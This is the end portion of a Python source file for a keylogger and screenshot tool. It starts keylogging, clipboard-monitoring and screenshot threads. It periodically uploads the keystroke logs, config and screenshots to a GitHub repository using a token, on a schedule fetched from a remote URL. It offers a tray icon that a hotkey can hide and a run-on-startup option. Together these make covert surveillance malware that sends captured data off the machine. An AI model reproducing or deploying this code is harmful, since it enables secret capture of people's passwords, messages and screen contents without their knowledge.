    github_token = GITHUB_TOKEN  # Replace with your GitHub token

    # Define file-to-subfolder mapping
    file_mapping = {
        "keylogerror.log": "keylogerror",
        "config.json": "config",
        "files_cache.json": "cache"
    }

    # Define folder-to-subfolder mapping
    folder_mapping = {
        "logs": "logs",
        # "screenshots": "screenshot folder"
    }
    
    # Define the screenshots folder path
    screenshots_folder = "screenshots"
    
    # Load the cache of uploaded screenshots
    load_uploaded_cache()
    
    # Load initial configuration
    load_config()

    print("Starting the upload monitoring script...")

    while True:  # Infinite loop for continuous execution
        
        # Fetch the upload interval from the URL
        # Fetch the upload interval and fallback interval from the URL
        upload_interval = fetch_value_from_url(INTERVAL_URL, "upload_interval", DEFAULT_UPLOAD_INTERVAL)
        fallback_interval = fetch_value_from_url(INTERVAL_URL, "upload_interval_status", DEFAULT_FALLBACK_INTERVAL)
        
        if not isinstance(upload_interval, int):
            upload_interval = DEFAULT_UPLOAD_INTERVAL
        
        # Fetch the upload interval dynamically
        readable_interval = format_interval(upload_interval)  # Format the interval
        logging.info(f"Upload interval set to {readable_interval}.")
        print(f"\nUpload interval set to {readable_interval}.")
        print(f"Fallback interval set to {fallback_interval} seconds.")

        # Check the last upload time
        last_upload_time = get_last_upload_time()
        
        # Perform the uploads
        try:

            # Calculate time until the next upload
            if last_upload_time:
                time_since_last_upload = (datetime.now() - last_upload_time).total_seconds()
                # time_until_next_upload = upload_interval - time_since_last_upload
                time_until_next_upload = max(0, upload_interval - time_since_last_upload)
                logging.info(f"Time until next upload: {format_interval(max(0, time_until_next_upload))}.")
                print(f"Time until next upload: {format_interval(time_until_next_upload)}.")
            else:
                time_until_next_upload = 0  # Upload immediately if no last upload time

            # Upload files if the interval has passed
            if time_until_next_upload <= 0:
                # Perform the upload
                print("Uploading files...")
                upload_multiple_to_specific_folders(file_mapping, folder_mapping, repo_name, branch_name, github_token)
                set_last_upload_time()
                print(f"Files uploaded successfully at {datetime.now().isoformat()}.")

            # Upload screenshots if the interval has passed
            if time_until_next_upload <= 0:
                print("Uploading screenshots folder...")
                upload_screenshots_folder_to_github(
                    screenshots_folder, repo_name, f"uploads/{screenshots_folder}", branch_name, github_token
                )
                print(f"Uploaded screenshots folder successfully at {datetime.now().isoformat()}.")
                # Update the last upload time
                set_last_upload_time()
                
                logging.info(f"Files uploaded successfully at {datetime.now().isoformat()}.")
                print(f"Files uploaded successfully at {datetime.now().isoformat()}.")
                
        except Exception as e:
            logging.error(f"Error during upload: {e}")
            print(f"Error during upload: {e}")

        # Sleep for a short time to avoid excessive checking
        # time.sleep(20)
        # time.sleep(interval_logs_Upload_status)
        # Wait for the next upload cycle
        # time.sleep(upload_interval if upload_interval != DEFAULT_UPLOAD_INTERVAL else FALLBACK_INTERVAL)
        time.sleep(upload_interval if upload_interval != DEFAULT_UPLOAD_INTERVAL else fallback_interval)


# create icon for system tray
# ----------------------------------------------------------------------------------
def create_icon():
    """Create a fallback icon image."""
    icon_image = Image.new("RGB", (64, 64), color=(255, 255, 255))
    draw = ImageDraw.Draw(icon_image)
    draw.ellipse((16, 16, 48, 48), fill=(0, 0, 255))
    return icon_image

def get_icon():
        """Retrieve the icon image."""
        try:
            # Check if the local icon file exists
            if os.path.exists(ICON_PATH):
                return Image.open(ICON_PATH)

            # If local file doesn't exist, try fetching from URL
            url = "https://cdn-icons-png.flaticon.com/512/4616/4616208.png"  # Replace with your image URL
            response = requests.get(url, timeout=5)
            response.raise_for_status()  # Raise an exception for HTTP errors
            return Image.open(BytesIO(response.content))

        except (FileNotFoundError, requests.exceptions.RequestException) as e:
            logging.error(f"Icon Load Error: {e}")
            print(f"Icon Load Error: {e}")
            return create_icon()  # Return a blue image as a fallback


# Update checkmarks dynamically
# ----------------------------------------------------------------------------------
def update_checkmarks(icon):
    interval_menu = Menu(
        MenuItem("30 seconds", set_interval, checked=lambda item: screenshot_interval == 30),
        MenuItem("60 seconds", set_interval, checked=lambda item: screenshot_interval == 60),
        MenuItem("2 Minutes", set_interval, checked=lambda item: screenshot_interval == 120),
        MenuItem("5 Minutes", set_interval, checked=lambda item: screenshot_interval == 300),
        MenuItem("10 Minutes", set_interval, checked=lambda item: screenshot_interval == 600),
        MenuItem("20 Minutes", set_interval, checked=lambda item: screenshot_interval == 1200),
        MenuItem("30 Minutes", set_interval, checked=lambda item: screenshot_interval == 1800),
        MenuItem("1 Hour", set_interval, checked=lambda item: screenshot_interval == 3600),
    )

    menu = Menu(
        MenuItem("Pause/Resume Screenshots", toggle_screenshots, checked=lambda item: is_running),
        MenuItem("Pause/Resume Keylogging", toggle_keylogging, checked=lambda item: listener_running),
        MenuItem("Set Screenshot Interval", interval_menu),
        MenuItem("Run on Startup", on_toggle_startup, checked=is_startup_checked),
        Menu.SEPARATOR,
        MenuItem("View Keylog", open_keylog_file),
        MenuItem("View Copied Keylog", open_copy_keylog_file),
        MenuItem("View Screenshot", open_Screenshot_folder),
        MenuItem("View Log", on_open_log),
        Menu.SEPARATOR,
        MenuItem("Check for Updates", lambda icon, item: check_for_update_async()),
        MenuItem("Restore Defaults", restore_defaults),  # Add restore option
        MenuItem("Developer", on_open_developer),
        MenuItem("Restart", restart_script),
        MenuItem("Exit", stop_script),
    )

    icon.menu = menu

# Toggle tray icon visibility
def toggle_tray_icon(force_state=None):
    """
    Toggle the visibility of the tray icon.
    :param force_state: If True or False, forces the tray icon visibility.
    """
    global tray_icon, icon_visible

    # Determine the target state
    target_state = force_state if force_state is not None else not icon_visible

    if target_state:
        # Show tray icon
        if tray_icon is None:
            tray_icon = create_tray_icon()
            threading.Thread(target=tray_icon.run, daemon=True).start()
        logging.warning("Tray icon shown.")
        print("Tray icon shown.")
    else:
        # Hide tray icon
        if tray_icon is not None:
            tray_icon.stop()
            tray_icon = None
        logging.warning("Tray icon hidden.")
        print("Tray icon hidden.")

    icon_visible = target_state



# Create tray icon
# ----------------------------------------------------------------------------------
def create_tray_icon():
    """
    Create the system tray icon and menu.
    """
    
    try:
        # Create the system tray icon
        title_with_shortcut = (f"{APP_NAME}\nShortcut Keys:- PrtSc")
        icon = Icon(
            APP_NAME, 
            get_icon(), 
            title_with_shortcut
        )
        update_checkmarks(icon)
        # icon.visible = False
        # icon.run()
        return icon
       
    except Exception as e:
        show_notification("Error", "Failed to load tray icon.")
        logging.error(f"Tray Icon Error: {e}")
        print(f"Tray Icon Error: {e}")
        sys.exit(1)


def main():
    try:
        # Initialize the tray icon and visibility state
        global tray_icon, icon_visible

        # Toggle the tray icon visibility based on the initial state
        toggle_tray_icon(force_state=icon_visible)

        print("\n\n----------------------------------------------------------------")
        print("Application started. Press PrtSc to toggle tray icon.")
        print("Press Ctrl+C to exit.\n\n")
        
        if not os.path.exists(ICON_PATH):
            logging.error("Icon file not found. Notifications will not include an icon.")
            print("Icon file not found. Notifications will not include an icon.")
        show_notification(f"{APP_NAME} Started", "The application has started successfully.")
        
        # Start keylogger
        # start_keylogger()
        keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
        keylogger_thread.start()

        
        # Start clipboard monitoring thread
        clipboard_thread = threading.Thread(target=monitor_clipboard, daemon=True)
        clipboard_thread.start()

        load_config()  # Load the interval from JSON
        # Notify the user of the loaded interval
        # interval_display = (
        #     f"{screenshot_interval} seconds" if screenshot_interval < 60 else
        #     f"{screenshot_interval // 60} minutes" if screenshot_interval < 3600 else
        #     f"{screenshot_interval // 3600} hour"
        # )
        # show_notification(APP_NAME, f"Loaded screenshot interval: {interval_display}.")
        
        # Start screenshot thread
        screenshot_thread = threading.Thread(target=take_screenshot, daemon=True)
        screenshot_thread.start()
        
        # Start folder check thread
        folder_check_thread = threading.Thread(target=schedule_folder_check, daemon=True)
        folder_check_thread.start()
    
        # check for the new updates
        clean_partial_files()
        # check_for_update_async()
        
        # upload logs 
        upload_logs()
        load_uploaded_cache()
        # clean_uploaded_cache()
        
        
    except KeyboardInterrupt:
        show_notification(APP_NAME, "Keylogger is closing...")
        logging.info("Application interrupted by user.")
        print("Application interrupted by user.")
        stop_script(tray_icon)  # Pass the tray_icon to stop_script
        sys.exit(0)
    except Exception as e:
        logging.error(f"Main Error: {e}")
        print(f"Main Error: {e}")
        stop_script(tray_icon)  # Pass the tray_icon to stop_script
        sys.exit(1)


if __name__ == "__main__":
    main()
